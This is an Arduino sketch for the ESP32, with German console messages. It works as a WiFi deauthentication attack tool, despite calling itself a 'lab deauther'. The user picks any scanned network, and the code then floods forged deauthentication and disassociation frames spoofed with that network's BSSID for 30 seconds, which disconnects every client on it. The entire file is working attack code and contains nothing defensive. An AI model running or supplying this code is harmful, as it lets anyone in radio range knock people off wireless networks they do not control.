#include <WiFi.h>
#include "esp_wifi.h"

uint8_t packet[26] = {
  0xC0, 0x00, 0x3A, 0x01,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
  0x00, 0x00,                         // Seq
  0x07, 0x00                          // Reason
};

void setup() {
  Serial.begin(115200);
  
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  
  esp_wifi_set_promiscuous(true);
  
  Serial.println("ESP32 Labor-Deauther (V1.0.0) bereit.");
}

void loop() {
  esp_wifi_set_promiscuous(false);
  Serial.println("\nScanne Netzwerke...");
  int n = WiFi.scanNetworks();

  if (n <= 0) {
    Serial.println("Keine WLANs gefunden");
    delay(2000);
    return;
  }

  for (int i = 0; i < n; i++){
    Serial.printf("%d: %s (CH %d)\n", i + 1, WiFi.SSID(i).c_str(), WiFi.channel(i));
  }

  Serial.println("WLAN auswählen:");
  while (!Serial.available()) {
    delay(10);
  }

  int sel = Serial.parseInt() - 1;
  while (Serial.available()) Serial.read();

  if(sel >= 0 && sel < n) {
    uint8_t* bssid = WiFi.BSSID(sel);
    int ch = WiFi.channel(sel);

    memcpy(&packet[10], bssid, 6);
    memcpy(&packet[16], bssid, 6);

    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous(true);
    
    Serial.printf("Angriff auf %s gestartet...\n", WiFi.SSID(sel).c_str());
    unsigned long end = millis() + 30000;
    uint16_t seq = 0;

    while (millis() < end){
      seq++;
      packet[22] = (seq << 4) & 0xFF;
      packet[23] = (seq >> 4) & 0xFF;

      packet[0] = 0xC0;
      esp_wifi_80211_tx(WIFI_IF_STA, packet, 26, false);
      
      packet[0] = 0xA0;
      esp_wifi_80211_tx(WIFI_IF_STA, packet, 26, false);

      delay(5); 
      yield();
    }
    
    esp_wifi_set_promiscuous(false);
    Serial.println("Angriff beendet.");
  }
}
